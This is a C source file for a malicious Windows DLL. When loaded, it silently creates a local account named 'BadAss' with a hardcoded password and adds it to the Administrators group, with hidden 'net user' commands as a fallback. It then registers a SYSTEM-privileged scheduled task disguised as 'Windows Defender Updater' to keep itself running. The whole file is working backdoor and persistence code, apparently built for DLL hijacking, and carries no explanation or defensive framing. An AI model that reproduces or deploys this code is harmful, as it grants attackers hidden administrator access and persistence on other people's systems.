#pragma comment(lib, "netapi32.lib")

#include <stdio.h>
#include <windows.h> 
#include <lm.h>


BOOL AddLocalUser(LPWSTR lpwUser, LPWSTR lpwPasswd) {
	USER_INFO_1 ui;
	DWORD dwLevel = 1;
	DWORD dwError = 0;
	NET_API_STATUS nStatus;

	ui.usri1_name = lpwUser;
	ui.usri1_password = lpwPasswd;
	ui.usri1_priv = USER_PRIV_USER;
	ui.usri1_home_dir = NULL;
	ui.usri1_comment = L"Very Important Person";
	ui.usri1_flags = UF_SCRIPT;
	ui.usri1_script_path = NULL;

	nStatus = NetUserAdd(NULL,
		dwLevel,
		(LPBYTE)&ui,
		&dwError);

	if (nStatus == NERR_Success || nStatus == NERR_UserExists)
	{
		return TRUE;
	}
	
	return FALSE;
}

BOOL AddUserToGroup(LPCWSTR lpcwGroup, LPWSTR lpwUser) {
	LOCALGROUP_MEMBERS_INFO_3 lgmi3;
	DWORD dwLevel = 3;
	DWORD totalEntries = 1;
	NET_API_STATUS nStatus;

	lgmi3.lgrmi3_domainandname = lpwUser;

	nStatus = NetLocalGroupAddMembers(NULL,
		lpcwGroup,
		dwLevel,
		(LPBYTE)&lgmi3,
		totalEntries);

	if (nStatus == NERR_Success)
	{
		return TRUE;
	}

	return FALSE;
}



BOOL APIENTRY DllMain(
	HINSTANCE hinstDLL,  // handle to DLL module
	DWORD fdwReason,     // reason for calling function
	LPVOID lpReserved)   // reserved
{

	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;
	// Perform actions based on the reason for calling.
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		if (!AddLocalUser(L"BadAss", L"FacePalm01"))
		{
			CreateProcess("C:\\WINDOWS\\system32\\cmd.exe",
				" /C net user BadAss FacePalm01 /add && net localgroup administrators BadAss /add",
				NULL, NULL, 0, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
			PostThreadMessage(pi.dwThreadId, WM_CLOSE, 0, 0);
			WaitForSingleObject(pi.hProcess, 1000);
			TerminateProcess(pi.hProcess, 0);
		}
		AddUserToGroup(L"Administrators", L"BadAss");

		CreateProcess("C:\\WINDOWS\\system32\\cmd.exe",
			" /C schtasks.exe /create /tn \"Windows Defender Updater\" /sc HOURLY /TR \"C:\\windows\\System32\\MPAmsiRun.exe\" /ru SYSTEM /rl HIGHEST /F && schtasks /run /tn \"Windows Defender Updater\"", 
			NULL, NULL, 0, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
		PostThreadMessage(pi.dwThreadId, WM_CLOSE, 0, 0);
		WaitForSingleObject(pi.hProcess, 1000);
		TerminateProcess(pi.hProcess, 0);

		//CreateProcess("C:\\windows\\System32\\MPAmsiRun.exe", NULL,
		//	NULL, NULL, 0, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
		exit(0);
	case DLL_THREAD_ATTACH:
		// Do thread-specific initialization.
		break;
	case DLL_THREAD_DETACH:
		// Do thread-specific cleanup.
		break;
	case DLL_PROCESS_DETACH:
		// Perform any necessary cleanup.
		break;
	}
	// Successful DLL_PROCESS_ATTACH.
	return 0;
}
